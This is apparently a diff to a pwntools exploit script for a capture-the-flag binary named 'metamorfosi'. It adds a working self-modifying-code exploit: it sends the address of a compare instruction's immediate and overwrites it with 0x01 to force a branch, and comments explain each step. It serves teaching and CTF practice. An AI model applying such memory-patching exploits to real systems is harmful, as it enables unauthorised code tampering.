@@ -6,6 +6,7 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('metamorfosi')
+context.terminal = "terminator -x".split()
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -39,14 +40,38 @@ continue
 
 io = start()
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+executable_page_start = 0x400000
+# This program calls
+#   mprotect(executable_page_start, 1, PROT_READ | PROT_WRITE | PROT_EXEC)
+# marking the page containing the test() function as both writable
+# and executable. The test function has a cmp instruction comparing
+# a local variable (initialized to 1) with the immediate 0. What we want to
+# do is to replace the immediate value with 1, so that the branch is taken.
+# With objdump we can see that the address of the immediate is
+# 'immediate_addr' (see below).
+
+immediate_addr = 0x40098c
+
+# This program does the following operations:
+#    char *dst;
+#    char buf[0x1000];
+#    scanf("%x", &dst);
+#    ...
+#    fgets(buf, 0x1000, stdin);
+#    strncpy(dst, buf, strlen(buf)-1);
+#    ....
+#    test();
+
+# We can send 'immediate_addr', so that the strncpy() will
+# start overwriting the test() code.
+io.sendline(hex(immediate_addr))
+# The fgets() stops at a newline, which is inserted by sendline()
+# after the three characters we pass as argument.
+# The fact that strlen() is used implies that we need to add a
+# terminator. The non-sense "strlen(buf)-1" impies that we need
+# to add an additional arbitrary character after the '\x01',
+# so that the strncpy() will copy exactly 1 character.
+io.sendline('\x01' + '\xab' + '\x00')
 
 io.interactive()
 
